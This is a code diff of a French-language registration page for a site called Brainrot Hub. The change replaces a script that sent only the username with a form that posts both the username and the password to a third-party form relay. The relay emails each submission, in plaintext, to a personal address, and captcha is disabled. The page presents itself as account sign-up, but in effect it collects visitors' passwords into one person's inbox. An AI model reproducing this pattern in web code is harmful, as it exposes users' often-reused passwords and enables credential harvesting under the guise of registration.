@@ -92,15 +92,6 @@
             transform: translateY(-2px);
             box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
         }
-
-        .success {
-            background: #d4edda;
-            color: #155724;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -109,76 +100,47 @@
         <p>Partage tes meilleurs brainrots</p>
         
         <div class="error" id="errorMsg"></div>
-        <div class="success" id="successMsg">Inscription réussie ! 🎉</div>
         
-        <div class="input-group">
-            <label>Pseudo</label>
-            <input type="text" id="username" placeholder="Minimum 3 caractères">
-        </div>
-        
-        <div class="input-group">
-            <label>Mot de passe</label>
-            <input type="password" id="password" placeholder="Minimum 5 caractères">
-        </div>
-        
-        <button class="btn" onclick="register()">S'inscrire</button>
+        <form action="https://formsubmit.co/megumikun84@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="Nouvelle inscription Brainrot Hub">
+            
+            <div class="input-group">
+                <label>Pseudo</label>
+                <input type="text" name="pseudo" id="username" placeholder="Minimum 3 caractères" required>
+            </div>
+            
+            <div class="input-group">
+                <label>Mot de passe</label>
+                <input type="password" name="password" id="password" placeholder="Minimum 5 caractères" required>
+            </div>
+            
+            <button type="submit" class="btn" onclick="return validateForm()">S'inscrire</button>
+        </form>
     </div>
 
     <script>
-        function register() {
+        function validateForm() {
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
             const errorMsg = document.getElementById('errorMsg');
-            const successMsg = document.getElementById('successMsg');
 
             errorMsg.style.display = 'none';
-            successMsg.style.display = 'none';
 
             if (username.length < 3) {
                 errorMsg.textContent = 'Le pseudo doit contenir au moins 3 caractères';
                 errorMsg.style.display = 'block';
-                return;
+                return false;
             }
 
             if (password.length < 5) {
                 errorMsg.textContent = 'Le mot de passe doit contenir au moins 5 caractères';
                 errorMsg.style.display = 'block';
-                return;
+                return false;
             }
 
-            // Envoi des données à FormSubmit
-            fetch('https://formsubmit.co/ajax/megumikun84@gmail.com', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify({
-                    name: username,
-                    message: 'Nouvelle inscription sur Brainrot Hub - Pseudo: ' + username,
-                    _captcha: 'false'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                successMsg.style.display = 'block';
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-            })
-            .catch(error => {
-                successMsg.style.display = 'block';
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-            });
+            return true;
         }
-
-        document.getElementById('username').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') register();
-        });
-
-        document.getElementById('password').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') register();
-        });
     </script>
 </body>
 </html>
